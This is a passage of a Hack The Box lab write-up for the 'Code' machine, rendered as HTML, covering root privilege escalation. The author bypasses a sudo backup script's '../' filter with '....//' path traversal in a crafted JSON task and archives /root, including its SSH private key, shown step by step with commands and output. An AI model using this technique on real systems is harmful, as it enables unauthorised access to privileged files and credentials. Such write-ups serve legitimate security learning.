+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/app/instance<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh martin@code.htb 
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span><span class="line"><span class="cl">martin@code:~$ 
+</span></span></code></pre></div>
+<h2 class="relative group">Privesc to root 
+    <div id="privesc-to-root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#privesc-to-root" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>While getting the lay of the land, we come accross some sudo permissions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> martin on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User martin may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/backy.sh
+</span></span></code></pre></div><p>This script takes in a json file then removes any <code>../</code> with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">updated_json</span><span class="o">=</span><span class="k">$(</span>/usr/bin/jq <span class="s1">&#39;.directories_to_archive |= map(gsub(&#34;\\.\\./&#34;; &#34;&#34;))&#39;</span> <span class="s2">&#34;</span><span class="nv">$json_file</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span></code></pre></div><p>It also makes sure the backup path starts with either <code>/var/</code> or <code>/home</code> with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">allowed_paths</span><span class="o">=(</span><span class="s2">&#34;/var/&#34;</span> <span class="s2">&#34;/home/&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span><span class="line"><span class="cl">is_allowed_path<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">path</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> allowed_path in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">allowed_paths</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$path</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="nv">$allowed_path</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> dir in <span class="nv">$directories_to_archive</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! is_allowed_path <span class="s2">&#34;</span><span class="nv">$dir</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/echo <span class="s2">&#34;Error: </span><span class="nv">$dir</span><span class="s2"> is not allowed. Only directories under /var/ and /home/ are allowed.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p><strong>BOTH</strong> of these security measures are weak to exploitation!</p>
+<p>For the path traversal prevention, we can simply extend <code>../</code> to <code>....//</code> so that when <code>../</code> is replaced, it still leaves behind a <code>../</code>. I guess next time they should have looped until none were left ;).</p>
+<p>With directory traversal, we can have our path start with either <code>/var/</code> or <code>/home/</code>, then traverse to any location we want. This means we can bakup <code>/root</code>!</p>
+<p>Our home folder conveniently has a <code>task.json</code> read for modifying!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ cat task.json
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;destination&#34;</span>: <span class="s2">&#34;/home/martin/backups/&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;multiprocessing&#34;</span>: true,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;verbose_log&#34;</span>: false,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;directories_to_archive&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;/home/app-production/app&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">]</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;exclude&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;.*&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>We can copy this file and modify the <code>directories_to_archive</code> field to backup the root directory! Make sure to remove the <code>exclude</code> field as well, or nothing will be archived.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ cat my_task.json
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;destination&#34;</span>: <span class="s2">&#34;/home/martin/backups/&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;multiprocessing&#34;</span>: true,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;verbose_log&#34;</span>: false,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;directories_to_archive&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;/var/....//root/&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>Now&hellip; exploit!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ sudo /usr/bin/backy.sh my_task.json
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 🍀 backy 1.2
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 📋 Working with my_task.json ...
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 💤 Nothing to sync
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 📤 Archiving: <span class="o">[</span>/var/../root<span class="o">]</span>
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 📥 To: /home/martin/backups ...
+</span></span><span class="line"><span class="cl">2025/08/31 07:09:34 📦
+</span></span><span class="line"><span class="cl">martin@code:~/backups$ ls
+</span></span><span class="line"><span class="cl">code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_August.tar.bz2  my_task.json  task.json
+</span></span></code></pre></div><p>I ended up moving my tar to the home directory because it kept getting deleted (not sure if it was by other players, or by some scripts). But we can unzip the bz archive to get our flag!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ tar xjvf code_var_.._root_2025_August.tar.bz2 
+</span></span><span class="line"><span class="cl">root/
+</span></span><span class="line"><span class="cl">root/.local/
+</span></span><span class="line"><span class="cl">root/.local/share/
+</span></span><span class="line"><span class="cl">root/.local/share/nano/
+</span></span><span class="line"><span class="cl">root/.local/share/nano/search_history
+</span></span><span class="line"><span class="cl">root/.selected_editor
+</span></span><span class="line"><span class="cl">root/.sqlite_history
+</span></span><span class="line"><span class="cl">root/.profile
+</span></span><span class="line"><span class="cl">root/scripts/
+</span></span><span class="line"><span class="cl">root/scripts/cleanup.sh
+</span></span><span class="line"><span class="cl">root/scripts/backups/
+</span></span><span class="line"><span class="cl">root/scripts/backups/task.json
+</span></span><span class="line"><span class="cl">root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
+</span></span><span class="line"><span class="cl">root/scripts/database.db
+</span></span><span class="line"><span class="cl">root/scripts/cleanup2.sh
+</span></span><span class="line"><span class="cl">root/.python_history
+</span></span><span class="line"><span class="cl">root/root.txt
+</span></span><span class="line"><span class="cl">root/.cache/
+</span></span><span class="line"><span class="cl">root/.cache/motd.legal-displayed
+</span></span><span class="line"><span class="cl">root/.ssh/
+</span></span><span class="line"><span class="cl">root/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">root/.bash_history
+</span></span><span class="line"><span class="cl">root/.bashrc
+</span></span><span class="line"><span class="cl">martin@code:~$ ls
+</span></span><span class="line"><span class="cl">backups  code_var_.._root_2025_August.tar.bz2  root
+</span></span><span class="line"><span class="cl">martin@code:~$ <span class="nb">cd</span> root
+</span></span><span class="line"><span class="cl">martin@code:~/root$ ls
+</span></span><span class="line"><span class="cl">root.txt  scripts
+</span></span><span class="line"><span class="cl">martin@code:~/root$ cat root.txt
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span></code></pre></div>
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This box was overall very fun and well made. I had to learn a lot about the inner-workings of the Python programming language and realized there was so much more to know about it (as it is with everything). There were probably 100&rsquo;s of better ways to exploit the web filter, but I hacked what I could together and got it done. The privesc was easy, but honestly it was welcomed after I spent so much time figuring out the foothold.</p>
+<p>Thank you for reading. Hopefully you learned something. If there were any spelling errors, ramblings, etc. I blame myself for doing this so late at night. Till next time!</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/crocpit/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_hackthebox/code/index.md"
+          data-oid-likes="likes_hackthebox/code/index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/crocpit/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/crocpit/categories/"
+                title="Categories">
+                
+                Categories
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          Copy, <em>right?</em> :thinking_face:
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/crocpit/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/crocpit/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
